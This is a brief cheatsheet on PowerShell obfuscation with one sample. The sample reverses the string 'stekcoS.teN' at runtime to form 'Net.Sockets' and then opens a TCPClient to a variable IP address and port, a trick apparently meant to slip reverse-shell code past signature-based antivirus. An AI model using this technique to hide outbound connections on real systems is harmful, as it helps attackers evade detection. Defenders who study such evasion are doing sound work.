# Cheatsheet PS1 obfuscation

**Sample for reverse string**
```
$String = "stekcoS.teN"
$class = ([regex]::Matches($String,'.','RightToLeft') | ForEach {$_.value}) -join ''

$client = New-Object System.$class.TCPClient($IPAddress,$Port)
```